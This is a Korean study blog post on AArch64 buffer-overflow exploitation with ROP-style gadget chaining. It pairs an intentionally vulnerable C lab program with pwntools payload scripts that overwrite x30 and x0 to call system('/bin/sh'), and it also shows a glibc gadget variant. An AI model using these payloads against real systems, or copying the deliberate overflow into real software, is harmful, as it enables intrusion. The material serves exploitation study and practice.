---
title: "[AArch64] Buffer OverFlow (with chaining)"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 바뀐 ASM과 register 들을 이용하여 gadget 사용하는 방법을 조금 다루겠다. #include #include #include void gift(){ write(1, \"/bin/sh\\x00\",0x8); system('ls'); } void"
date: "2024-03-20"
translation_key: "tistory-7761d84afc1a"
tags: ["STUDY/PWNABLE_AArch64"]
category: "STUDY/PWNABLE_AArch64"
source_url: "https://whrdud727.tistory.com/entry/AArch64-Buffer-OverFlow-with-chaining"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※****

바뀐 ASM과 register 들을 이용하여 gadget 사용하는 방법을 조금 다루겠다.

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void gift(){
	write(1, "/bin/sh\x00",0x8);
	system('ls');
}

void gadget(){
	asm("ldr x30, [sp]");
	asm("ldr x0, [sp, #8]");
	asm("ldr x1, [sp, #16]");
	asm("ldr x2, [sp, #24]");
	asm("ret");

}
void vuln(){
	char buf[0x20];

	read(0,buf,0x100);
	printf("Your Input : %s", buf);
}

int main(){
	write(1,"Input : ",0x8);

	vuln();

	return 0;
}
```

ldr 명령어를 사용하여 sp로부터 x30, x0, x1, x2 로 차례대로 값을 전달하는 gadget을 추가했다.

![](/assets/images/tistory/tistory-7761d84afc1a/001.png)

그리고 /bin/sh 문자열과 system()의 주소가 따로 존재하기 때문에 각각의 주소를 gift()로부터 구해준다.

![](/assets/images/tistory/tistory-7761d84afc1a/002.png)

X30이 register가 ret이기 때문에 해당 부분에 system()의 주소가 들어가게 하고,

첫 번째 인자 전달하는 X0에 /bin/sh 문자열의 주소를 넣어준다.

그리고 X1, X2에는 dummy 값을 넣어주면 system('/bin/sh')를 실행할 수 있다.

```
from pwn import *

p = process(['qemu-aarch64-static', 'a.out'])
#p = process(['qemu-aarch64-static', '-g',  '1234', 'a.out'])
e = ELF('a.out')

context.log_level = 'debug'

#func
system =e.sym['system']
read = e.sym['read']
write = e.sym['write']

#gadget
gadget= 0x0000000000400704
bss = e.bss()
binsh = 0x4593b8

#payload
payload = b'a'*0x20
payload += b'b'*0x8

payload += p64(gadget)
payload += p64(system)
payload += p64(binsh)
payload += p64(0)
payload += p64(0)

#send
p.sendafter(b':', payload)

p.interactive()
```

* * *

glibc 파일을 살펴보면 아래와 같은 gadget이 있는데 이를 사용할 수 있다.

```
ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
```

이런 경우 sp+0x18 위치에 /bin/sh 문자열을 입력하고, sp 위치에 차레대로 X29, X30로 사용할 값을 차례대로 입력하면 된다.

사용 예시이다.

![](/assets/images/tistory/tistory-7761d84afc1a/003.png)

sp-0x30위치에 데이터를 입력하는 코드의 모습이다.

이 코드에 아래와 같이 입력하면 X29, X30, X0을 변조 할 수 있다.

```
payload = b'a'*0x28
payload += p64(gadget)
payload += b'a'*0x10
payload += p64(system)*2
payload += p64(0x0)
payload += p64(binsh)
```
